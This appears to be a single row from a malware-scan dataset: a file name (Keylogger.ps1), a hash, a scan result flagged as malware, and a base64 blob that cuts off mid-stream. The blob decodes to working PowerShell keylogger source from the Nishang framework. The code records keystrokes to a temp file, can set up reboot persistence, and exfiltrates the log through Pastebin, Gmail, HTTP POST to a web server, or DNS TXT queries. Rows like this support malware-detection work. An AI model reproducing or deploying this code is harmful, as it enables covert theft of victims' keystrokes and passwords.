Keylogger.ps1,5f4c277bfca78d9f624de155969ec544,Scan result is 32768. IsMalware: 1,PCMKLlNZTk9QU0lTCk5pc2hhbmcgUGF5bG9hZCB3aGljaCBsb2dzIGtleXMuCgouREVTQ1JJUFRJT04KVGhpcyBwYXlsb2FkIGxvZ3MgYSB1c2VyJ3Mga2V5cyBhbmQgd3JpdGVzIHRoZW0gdG8gZmlsZSBrZXkubG9nIChJIGtub3cgaXRzIGJhZCA6fCkgaW4gdXNlcidzIHRlbXAgZGlyZWN0b3J5LgpUaGUga2V5cyBhcmUgdGhhbiBwYXN0ZWQgdG8gcGFzdGViaW58dGlueXBhc3RlfGdtYWlsfGFsbCBhcyBwZXIgc2VsZWN0aW9uLiBTYXZlZCBrZXlzIGNvdWxkIHRoZW4gYmUgZGVjb2RlZAp1c2luZyB0aGUgUGFyc2VfS2V5IHNjcmlwdCBpbiBuaXNoYW5nLgoKLlBBUkFNRVRFUiBwZXJzaXN0ClVzZSB0aGlzIHBhcmFtZXRlciB0byBhY2hpZXZlIHJlYm9vdCBwZXJzaXN0ZW5jZS4gRGlmZmVyZW50IG1ldGhvZHMgb2YgcGVyc2lzdGVuY2Ugd2l0aCBBZG1pbiBhY2Nlc3MgYW5kIG5vcm1hbCB1c2VyIGFjY2Vzcy4KCi5QQVJBTUVURVIgRXhmaWxPcHRpb24KVGhlIG1ldGhvZCB5b3Ugd2FudCB0byB1c2UgZm9yIGV4Zml0cmF0aW9uIG9mIGRhdGEuIFZhbGlkIG9wdGlvbnMgYXJlICJnbWFpbCIsInBhc3RlYmluIiwiV2ViU2VydmVyIiBhbmQgIkROUyIuCgouUEFSQU1FVEVSIGRldl9rZXkKVGhlIFVuaXF1ZSBBUEkga2V5IHByb3ZpZGVkIGJ5IHBhc3RlYmluIHdoZW4geW91IHJlZ2lzdGVyIGEgZnJlZSBhY2NvdW50LgpVbnVzZWQgZm9yIG90aGVyIG9wdGlvbnMKCi5QQVJBTUVURVIgdXNlcm5hbWUKVXNlcm5hbWUgZm9yIHRoZSBwYXN0ZWJpbi9nbWFpbCBhY2NvdW50IHdoZXJlIGRhdGEgd291bGQgYmUgZXhmaWx0cmF0ZWQuClVudXNlZCBmb3Igb3RoZXIgb3B0aW9ucwoKLlBBUkFNRVRFUiBwYXNzd29yZApQYXNzd29yZCBmb3IgdGhlIHBhc3RlYmluL2dtYWlsIGFjY291bnQgd2hlcmUgZGF0YSB3b3VsZCBiZSBleGZpbHRyYXRlZC4KVW51c2VkIGZvciBvdGhlciBvcHRpb25zCgouUEFSQU1FVEVSIFVSTApUaGUgVVJMIG9mIHRoZSB3ZWJzZXJ2ZXIgd2hlcmUgUE9TVCByZXF1ZXN0cyB3b3VsZCBiZSBzZW50LgoKLlBBUkFNRVRFUiBEb21haW5OYW1lClRoZSBEb21haW5OYW1lLCB3aG9zZSBzdWJkb21haW5zIHdvdWxkIGJlIHVzZWQgZm9yIHNlbmRpbmcgVFhUIHF1ZXJpZXMgdG8uCgouUEFSQU1FVEVSIEF1dGhOUwpBdXRob3JpdGF0aXZlIE5hbWUgU2VydmVyIGZvciB0aGUgZG9tYWluIHNwZWNpZmllZCBpbiBEb21haW5OYW1lCgouUEFSQU1FVEVSIE1hZ2ljU3RyaW5nClRoZSBzdHJpbmcgd2hpY2ggd2hlbiBmb3VuZCBhdCBDaGVja1VSTCB3aWxsIHN0b3AgdGhlIGtleWxvZ2dlci4KCi5QQVJBTUVURVIgQ2hlY2tVUkwKVGhlIFVSTCB3aGljaCB3b3VsZCBjb250YWluIHRoZSBNYWdpY1N0cmluZyB1c2VkIHRvIHN0b3Aga2V5bG9nZ2luZy4KCi5FWEFNUExFClBTID4gLlxLZXlsb2dnZXIucHMxClRoZSBwYXlsb2FkIHdpbGwgYXNrIGZvciBhbGwgcmVxdWlyZWQgb3B0aW9ucy4KCi5FWEFNUExFClBTID4gLlxLZXlsb2dnZXIucHMxIC1DaGVja1VSTCBodHRwOi8vcGFzdGViaW4uY29tL3Jhdy5waHA/aT1qcVAydkozeCAtTWFnaWNTdHJpbmcgc3RvcHRoaXMKVXNlIGFib3ZlIHdoZW4gdXNpbmcgdGhlIHBheWxvYWQgZnJvbSBub24taW50ZXJhY3RpdmUgc2hlbGxzIGFuZCBubyBleGZpbHRyYXRpb24gaXMgcmVxdWlyZWQuCgouRVhBTVBMRQpQUyA+IC5cS2V5bG9nZ2VyLnBzMSAtQ2hlY2tVUkwgaHR0cDovL3Bhc3RlYmluLmNvbS9yYXcucGhwP2k9anFQMnZKM3ggLU1hZ2ljU3RyaW5nIHN0b3B0aGlzIC1leGZpbCAtRXhmaWxPcHRpb24gV2ViU2VydmVyIC1VUkwgaHR0cDovLzE5Mi4xNjguMjU0LjIyNi9kYXRhL2NhdGNoLnBocApVc2UgYWJvdmUgZm9yIGV4ZmlsdHJhdGlvbiB0byBhIHdlYnNlcnZlciB3aGljaCBsb2dzIFBPU1QgcmVxdWVzdHMKCgouRVhBTVBMRQpQUyA+IC5cS2V5bG9nZ2VyLnBzMSAtcGVyc2lzdAoKVXNlIGFib3ZlIGZvciByZWJvb3QgcGVyc2lzdGVuY2UuCgouTElOSwpodHRwOi8vbGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLwpodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwojPgoKICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lPSJub2V4ZmlsIildIFBhcmFtKCAKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkcGVyc2lzdCwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJGV4ZmlsLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJzZXRuYW1lPSJub2V4ZmlsIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ2hlY2tVUkwsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyc2V0bmFtZT0iZXhmaWwiKV0KICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlcnNldG5hbWU9Im5vZXhmaWwiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRNYWdpY1N0cmluZywKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICRGYWxzZSwgUGFyYW1ldGVyc2V0bmFtZT0iZXhmaWwiKV0gW1ZhbGlkYXRlU2V0KCJnbWFpbCIsInBhc3RlYmluIiwiV2ViU2VydmVyIiwiRE5TIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRXhmaWxPcHRpb24sCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildIAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJGRldl9rZXkgPSAibnVsbCIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0LCBNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkdXNlcm5hbWUgPSAibnVsbCIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA1LCBNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkcGFzc3dvcmQgPSAibnVsbCIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA2LCBNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVVJMID0gIm51bGwiLAogICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNywgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbk5hbWUgPSAibnVsbCIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA4LCBNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQXV0aE5TID0gIm51bGwiICAgCiAgIAogICAgKQoKCgokZnVuY3Rpb25zID0gIHsKCmZ1bmN0aW9uIHNjcmlwdDpLZXlsb2dnZXIKewogICAgUGFyYW0gKCAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE1hZ2ljU3RyaW5nLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENoZWNrVVJMCiAgICApCiAgICAKICAgICRzaWduYXR1cmUgPSBAIiAKICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0bywgRXhhY3RTcGVsbGluZz10cnVlKV0gCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBzaG9ydCBHZXRBc3luY0tleVN0YXRlKGludCB2aXJ0dWFsS2V5Q29kZSk7IAoiQCAKICAgICRnZXRLZXlTdGF0ZSA9IEFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICRzaWduYXR1cmUgLW5hbWUgIk5ld3R5cGUiIC1uYW1lc3BhY2UgbmV3bmFtZXNwYWNlIC1wYXNzVGhydSAKICAgICRjaGVjayA9IDAKICAgIHdoaWxlICgkdHJ1ZSkgCiAgICB7IAogICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNDAgCiAgICAgICAgJGxvZ2dlZCA9ICIiIAogICAgICAgICRyZXN1bHQ9IiIgCiAgICAgICAgJHNoaWZ0X3N0YXRlPSIiIAogICAgICAgICRjYXBzX3N0YXRlPSIiIAogICAgICAgIGZvciAoJGNoYXI9MTskY2hhciAtbGUgMjU0OyRjaGFyKyspIAogICAgICAgIHsgCiAgICAgICAgICAgICR2a2V5ID0gJGNoYXIgCiAgICAgICAgICAgICRsb2dnZWQgPSAkZ2V0S2V5U3RhdGU6OkdldEFzeW5jS2V5U3RhdGUoJHZrZXkpIAogICAgICAgICAgICBpZiAoJGxvZ2dlZCAtZXEgLTMyNzY3KSAKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgIGlmKCgkdmtleSAtZ2UgNDgpIC1hbmQgKCR2a2V5IC1sZSA1NykpIAogICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAkbGVmdF9zaGlmdF9zdGF0ZSA9ICRnZXRLZXlTdGF0ZTo6R2V0QXN5bmNLZXlTdGF0ZSgxNjApIAogICAgICAgICAgICAgICAgICAgICRyaWdodF9zaGlmdF9zdGF0ZSA9ICRnZXRLZXlTdGF0ZTo6R2V0QXN5bmNLZXlTdGF0ZSgxNjEpIAogICAgICAgICAgICAgICAgICAgICAgICBpZigoJGxlZnRfc2hpZnRfc3RhdGUgLWVxIC0zMjc2OCkgLW9yICgkcmlnaHRfc2hpZnRfc3RhdGUgLWVxIC0zMjc2OCkpIAogICAgICAgICAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICJTLSIgKyAkdmtleSAKICAgICAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkdmtleSAKICAgICAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgZWxzZWlmKCgkdmtleSAtZ2UgNjQpIC1hbmQgKCR2a2V5IC1sZSA5MCkpIAogICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAkbGVmdF9zaGlmdF9zdGF0ZSA9ICRnZXRLZXlTdGF0ZTo6R2V0QXN5bmNLZXlTdGF0ZSgxNjApIAogICAgICAgICAgICAgICAgICAgICRyaWdodF9zaGlmdF9zdGF0ZSA9ICRnZXRLZXlTdGF0ZTo6R2V0QXN5bmNLZXlTdGF0ZSgxNjEpIAogICAgICAgICAgICAgICAgICAgICRjYXBzX3N0YXRlID0gW2NvbnNvbGVdOjpDYXBzTG9jayAKICAgICAgICAgICAgICAgICAgICBpZighKCgkbGVmdF9zaGlmdF9zdGF0ZSAtZXEgLTMyNzY4KSAtb3IgKCRyaWdodF9zaGlmdF9zdGF0ZSAtZXEgLTMyNzY4KSkgLXhvciAkY2Fwc19zdGF0ZSkgCiAgICAgICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICJTLSIgKyAkdmtleSAKICAgICAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgICAgIGVsc2UgCiAgICAgICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICR2a2V5IAogICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgZWxzZWlmKCgoJHZrZXkgLWdlIDE4NikgLWFuZCAoJHZrZXkgLWxlIDE5MikpIC1vciAoKCR2a2V5IC1nZSAyMTkpIC1hbmQgKCR2a2V5IC1sZSAyMjIpKSkgCiAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICRsZWZ0X3NoaWZ0X3N0YXRlID0gJGdldEtleVN0YXRlOjpHZXRBc3luY0tleVN0YXRlKDE2MCkgCiAgICAgICAgICAgICAgICAgICAgJHJpZ2h0X3NoaWZ0X3N0YXRlID0gJGdldEtleVN0YXRlOjpHZXRBc3luY0tleVN0YXRlKDE2MSkgCiAgICAgICAgICAgICAgICAgICAgaWYoKCRsZWZ0X3NoaWZ0X3N0YXRlIC1lcSAtMzI3NjgpIC1vciAoJHJpZ2h0X3NoaWZ0X3N0YXRlIC1lcSAtMzI3NjgpKSAKICAgICAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gIlMtIiArICR2a2V5IAogICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICR2a2V5IAogICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICR2a2V5IAogICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICRub3cgPSBHZXQtRGF0ZTsgCiAgICAgICAgICAgICAgICAkbG9nTGluZSA9ICIkcmVzdWx0ICIgCiAgICAgICAgICAgICAgICAkZmlsZW5hbWUgPSAiJGVudjp0ZW1wXGtleS5sb2ciIAogICAgICAgICAgICAgICAgT3V0LUZpbGUgLUZpbGVQYXRoICRmaWxlTmFtZSAtQXBwZW5kIC1JbnB1dE9iamVjdCAiJGxvZ0xpbmUiIAoKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkY2hlY2srKwogICAgICAgIGlmICgkY2hlY2sgLWVxIDYwMDApCiAgICAgICAgewogICAgICAgICAgICAkd2ViY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAogICAgICAgICAgICAkZmlsZWNvbnRlbnQgPSAkd2ViY2xpZW50LkRvd25sb2FkU3RyaW5nKCIkQ2hlY2tVUkwiKQogICAgICAgICAgICBpZiAoJGZpbGVjb250ZW50IC1lcSAkTWFnaWNTdHJpbmcpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGNoZWNrID0gMAogICAgICAgIH0KICAgIH0KfQoKICAgIGZ1bmN0aW9uIEtleXBhc3RlCiAgICB7CiAgICAgICAgUGFyYW0gKCAKICAgICAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJEV4ZmlsT3B0aW9uLAogICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAkZGV2X2tleSwKICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJHVzZXJuYW1lLAoKICAgICAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJHBhc3N3b3JkLAogICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAkVVJMLAoKICAgICAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDUsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJEF1dGhOUywKCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA2LCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRNYWdpY1N0cmluZywKICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDcsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJENoZWNrVVJMCiAgICAgICAgKQoKICAgICAgICAkY2hlY2sgPSAwCiAgICAgICAgd2hpbGUoJHRydWUpIAogICAgICAgIHsgCiAgICAgICAgICAgICRyZWFkID0gMAogICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1IAogICAgICAgICAgICAkcGFzdGV2YWx1ZT1HZXQtQ29udGVudCAkZW52OnRlbXBca2V5LmxvZyAKICAgICAgICAgICAgJHJlYWQrKwogICAgICAgICAgICBpZiAoJHJlYWQgLWVxIDMwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBPdXQtRmlsZSAtRmlsZVBhdGggJGVudjp0ZW1wXGtleS5sb2cgLUZvcmNlIC1JbnB1dE9iamVjdCAiICIgCiAgICAgICAgICAgICAgICAkcmVhZCA9IDAKICAgICAgICAgICAgfQogICAgICAgICAgICAkbm93ID0gR2V0LURhdGU7IAogICAgICAgICAgICAkbmFtZSA9ICRlbnY6Q09NUFVURVJOQU1FIAogICAgICAgICAgICAkcGFzdGVfbmFtZSA9ICRuYW1lICsgIiA6ICIgKyAkbm93LlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCJkZC9NTS95eXl5IEhIOm1tOnNzOmZmZiIpCiAgICAgICAgICAgIGZ1bmN0aW9uIHBvc3RfaHR0cCgkdXJsLCRwYXJhbWV0ZXJzKSAKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICRodHRwX3JlcXVlc3QgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgTXN4bWwyLlhNTEhUVFAgCiAgICAgICAgICAgICAgICAkaHR0cF9yZXF1ZXN0Lm9wZW4oIlBPU1QiLCAkdXJsLCAkZmFsc2UpIAogICAgICAgICAgICAgICAgJGh0dHBfcmVxdWVzdC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKSAKICAgICAgICAgICAgICAgICRodHRwX3JlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1sZW5ndGgiLCAkcGFyYW1ldGVycy5sZW5ndGgpOyAKICAgICAgICAgICAgICAgICRodHRwX3JlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcigiQ29ubmVjdGlvbiIsICJjbG9zZSIpIAogICAgICAgICAgICAgICAgJGh0dHBfcmVxdWVzdC5zZW5kKCRwYXJhbWV0ZXJzKSAKICAgICAgICAgICAgICAgICRzY3JpcHQ6c2Vzc2lvbl9rZXk9JGh0dHBfcmVxdWVzdC5yZXNwb25zZVRleHQgCiAgICAgICAgICAgIH0gCgogICAgICAgICAgICBmdW5jdGlvbiBDb21wcmVzcy1FbmNvZGUKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgI0NvbXByZXNzaW9uIGxvZ2ljIGZyb20gaHR0cDovL3d3dy5kYXJrb3BlcmF0b3IuY29tL2Jsb2cvMjAxMy8zLzIxL3Bvd2Vyc2hlbGwtYmFzaWNzLWV4ZWN1dGlvbi1wb2xpY3ktYW5kLWNvZGUtc2lnbmluZy1wYXJ0LTIuaHRtbAogICAgICAgICAgICAgICAgJG1zID0gTmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0KICAgICAgICAgICAgICAgICRhY3Rpb24gPSBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6Q29tcHJlc3MKICAgICAgICAgICAgICAgICRjcyA9IE5ldy1PYmplY3QgSU8uQ29tcHJlc3Npb24uRGVmbGF0ZVN0cmVhbSAoJG1zLCRhY3Rpb24pCiAgICAgICAgICAgICAgICAkc3cgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlciAoJGNzLCBbVGV4dC5FbmNvZGluZ106OkFTQ0lJKQogICAgICAgICAgICAgICAgJHBhc3RldmFsdWUgfCBGb3JFYWNoLU9iamVjdCB7JHN3LldyaXRlTGluZSgkXyl9CiAgICAgICAgICAgICAgICAkc3cuQ2xvc2UoKQogICAgICAgICAgICAgICAgIyBCYXNlNjQgZW5jb2RlIHN0cmVhbQogICAgICAgICAgICAgICAgJGNvZGUgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRtcy5Ub0FycmF5KCkpCiAgICAgICAgICAgICAgICByZXR1cm4gJGNvZGUKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCRleGZpbG9wdGlvbiAtZXEgInBhc3RlYmluIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHV0ZmJ5dGVzICA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJERhdGEpCiAgICAgICAgICAgICAgICAkcGFzdGV2YWx1ZSA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCR1dGZieXRlcykKICAgICAgICAgICAgICAgIHBvc3RfaHR0cCAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vYXBpL2FwaV9sb2dpbi5waHAiICJhcGlfZGV2X2tleT0kZGV2X2tleSZhcGlfdXNlcl9uYW1lPSR1c2VybmFtZSZhcGlfdXNlcl9wYXNzd29yZD0kcGFzc3dvcmQiIAogICAgICAgICAgICAgICAgcG9zdF9odHRwICJodHRwczovL3Bhc3RlYmluLmNvbS9hcGkvYXBpX3Bvc3QucGhwIiAiYXBpX3VzZXJfa2V5PSRzZXNzaW9uX2tleSZhcGlfb3B0aW9uPXBhc3RlJmFwaV9kZXZfa2V5PSRkZXZfa2V5JmFwaV9wYXN0ZV9uYW1lPSRwYXN0ZW5hbWUmYXBpX3Bhc3RlX2NvZGU9JHBhc3RldmFsdWUmYXBpX3Bhc3RlX3ByaXZhdGU9MiIgCiAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgZWxzZWlmICgkZXhmaWxvcHRpb24gLWVxICJnbWFpbCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNodHRwOi8vc3RhY2tvdmVyZmxvdy5jb20vcXVlc3Rpb25zLzEyNTIzMzUvc2VuZC1tYWlsLXZpYS1nbWFpbC13aXRoLXBvd2Vyc2hlbGwtdjJzLXNlbmQtbWFpbG1lc3NhZ2UKICAgICAgICAgICAgICAgICRzbXRwc2VydmVyID0gw6LigqzFk3NtdHAuZ21haWwuY29tw6LigqwKICAgICAgICAgICAgICAgICRtc2cgPSBuZXctb2JqZWN0IE5ldC5NYWlsLk1haWxNZXNzYWdlCiAgICAgICAgICAgICAgICAkc210cCA9IG5ldy1vYmplY3QgTmV0Lk1haWwuU210cENsaWVudCgkc210cFNlcnZlciApCiAgICAgICAgICAgICAgICAkc210cC5FbmFibGVTc2wgPSAkVHJ1ZQogICAgICAgICAgICAgICAgJHNtdHAuQ3JlZGVudGlhbHMgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuTmV0d29ya0NyZWRlbnRpYWwoIiR1c2VybmFtZSIsICIkcGFzc3dvcmQiKTsgCiAgICAgICAgICAgICAgICAkbXNnLkZyb20gPSAiJHVzZXJuYW1lQGdtYWlsLmNvbSIKICAgICAgICAgICAgICAgICRtc2cuVG8uQWRkKCIkdXNlcm5hbWVAZ21haWwuY29tIikKICAgICAgICAgICAgICAgICRtc2cuU3ViamVjdCA9ICRwYXN0ZW5hbWUKICAgICAgICAgICAgICAgICRtc2cuQm9keSA9ICRwYXN0ZXZhbHVlCiAgICAgICAgICAgICAgICBpZiAoJGZpbGVuYW1lKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRhdHQgPSBuZXctb2JqZWN0IE5ldC5NYWlsLkF0dGFjaG1lbnQoJGZpbGVuYW1lKQogICAgICAgICAgICAgICAgICAgICRtc2cuQXR0YWNobWVudHMuQWRkKCRhdHQpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkc210cC5TZW5kKCRtc2cpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGVsc2VpZiAoJGV4Zmlsb3B0aW9uIC1lcSAid2Vic2VydmVyIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJERhdGEgPSBDb21wcmVzcy1FbmNvZGUgICAgCiAgICAgICAgICAgICAgICBwb3N0X2h0dHAgJFVSTCAkRGF0YQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJEV4ZmlsT3B0aW9uIC1lcSAiRE5TIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGxlbmd0aG9mc3Vic3RyID0gMAogICAgICAgICAgICAgICAgJGNvZGUgPSBDb21wcmVzcy1FbmNvZGUKICAgICAgICAgICAgICAgICRxdWVyaWVzID0gW2ludF0oJGNvZGUuTGVuZ3RoLzYzKQogICAgICAgICAgICAgICAgd2hpbGUgKCRxdWVyaWVzIC1uZSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRxdWVyeXN0cmluZyA9ICRjb2RlLlN1YnN0cmluZygkbGVuZ3Rob2ZzdWJzdHIsNjMpCiAgICAgICAgICAgICAgICAgICAgSW52b2tlLUV4cHJlc3Npb24gIm5zbG9va3VwIC1xdWVyeXR5cGU9dHh0ICRxdWVyeXN0cmluZy4kRG9tYWluTmFtZSAkRXhmaWxOUyIKICAgICAgICAgICAgICAgICAgICAkbGVuZ3Rob2ZzdWJzdHIgKz0gNjMKICAgICAgICAgICAgICAgICAgICAkcXVlcmllcyAtPSAxCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkbW9kID0gJGNvZGUuTGVuZ3RoJTYzCiAgICAgICAgICAgICAgICAkcXVlcnkgPSAkY29kZS5TdWJzdHJpbmcoJGNvZGUuTGVuZ3RoIC0gJG1vZCwgJG1vZCkKICAgICAgICAgICAgICAgIEludm9rZS1FeHByZXNzaW9uICJuc2xvb2t1cCAtcXVlcnl0eXBlPXR4dCAkcXVlcnkuJERvbWFpbk5hbWUgJEV4ZmlsTlMiCgogICAgICAgICAgICB9CgogICAgICAgICAgICAkY2hlY2srKwogICAgICAgICAgICBpZiAoJGNoZWNrIC1lcSA2MDAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkY2hlY2sgPSAwCiAgICAgICAgICAgICAgICAkd2ViY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAogICAgICAgICAgICAgICAgJGZpbGVjb250ZW50ID0gJHdlYmNsaWVudC5Eb3dubG9hZFN0cmluZygiJENoZWNrVVJMIikKICAgICAgICAgICAgICAgIGlmICgkZmlsZWNvbnRlbnQgLWVxICRNYWdpY1N0cmluZykKI